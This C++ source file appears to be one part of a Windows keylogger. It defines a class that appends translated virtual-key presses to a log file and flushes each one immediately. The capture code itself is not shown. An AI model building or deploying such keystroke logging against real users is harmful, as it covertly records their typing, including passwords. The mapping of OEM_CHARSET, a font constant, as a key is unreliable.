//
// Created by actua on 5/21/2024.
//

#include "Key.h"
#include <windows.h>
#include <iostream>


// Constructor to open the file
 Key::Key(const std::string &fname) {
   // Open the file in append mode
   keyLog.open(fname, std::ios::app);
   if(!keyLog.is_open()) {
     std::cerr << "Error opening file: " << fname << std::endl;
     exit(1);
   }
 }

// Destructor to close the file
Key::~Key() {
   // Close the file
   if (keyLog.is_open()) {
     keyLog.close();
   }
}

// Log the key to the file
void Key::logKey(const char key) {
   keyLog << key;
   // Flush the buffer to write the key immediately
   keyLog.flush();
}

// Translate the key to a string to log
std::string Key::translateKey(const int key) {
   // Translate the key to a string
   std::string keyStr;
   switch(key) {
     case VK_RETURN:
       keyStr = "\n";
       break;
     case VK_SPACE:
       keyStr = " ";
       break;
     case VK_BACK:
       keyStr = "\b";
       break;
     case VK_TAB:
       keyStr = "\t";
       break;
     case OEM_CHARSET:
       keyStr = " ";
       break;
     default:
       keyStr = static_cast<char>(key);

   }
   return keyStr;
}